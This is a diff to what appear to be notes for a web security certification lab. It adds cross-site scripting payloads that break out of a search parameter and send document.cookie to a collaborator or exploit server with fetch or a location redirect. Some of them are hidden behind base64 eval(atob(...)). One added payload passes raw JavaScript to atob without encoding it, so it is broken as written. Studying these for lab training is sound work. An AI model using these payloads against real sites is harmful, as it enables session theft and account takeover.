@@ -128,7 +128,9 @@ location='URL'
 #### App 1
 ```
 \\"-alert('XSS')}//
+"-alert(1)-"
 \\"-eval(atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="))}//
+\\"-eval(atob("fetch(`https://collab/?XSS=`+document.cookie)"))}//"
 ```
 For SearchTerm: base64 for atob string --> urlencode for full value of SearchTerm, i.e:
 ```
@@ -139,6 +141,11 @@ location='https://exploit-...exploit-server.net/random?c='+document.cookie</@bas
 <script>
 window.location.replace("https://...web-security-academy.net/?SearchTerm=\\"-eval(atob("document.
 location='https://exploit-...exploit-server.net/random?c='+document.cookie"))}//'");
+</script>
+
+For searchTerm: base64 encode everything under atob, then url encode everything under document.location
+<script>
+  document.location="https://...web-security-academy.net/?SearchTerm=\\"-eval(atob("fetch(`https://...oastify.com/?XSS=`+document.cookie)"))}//""
 </script>
 ```
 
@@ -162,7 +169,8 @@ Some payloads from wr3dmast3r article about [BSCP certification](https://habr.co
 "-alert(window["document"]["cookie"])-" 
 "-window["alert"](window["document"]["cookie"])-" 
 "-self["alert"](self["document"]["cookie"])-"
-fetch(`https://COLLAB/?xss=` + window["document"]["cookie"]) // send to your server
+fetch(`https://COLLAB/?xss=` + window["document"]["cookie"]) // send to your server // UPD: might not work if you 
+make mistake. use https
 "-eval(atob("fetch(`https://collaborator/?xss=` + window["document"]["cookie"])"))-" // base64 encode
 "-eval(atob("ZmV0Y2goYGh0dHBzOi8vY29sbGFib3JhdG9yLz94c3M9YCArIHdpbmRvd1siZG9jdW1lbnQiXVsiY29va2llIl0p"))-"
 <script>
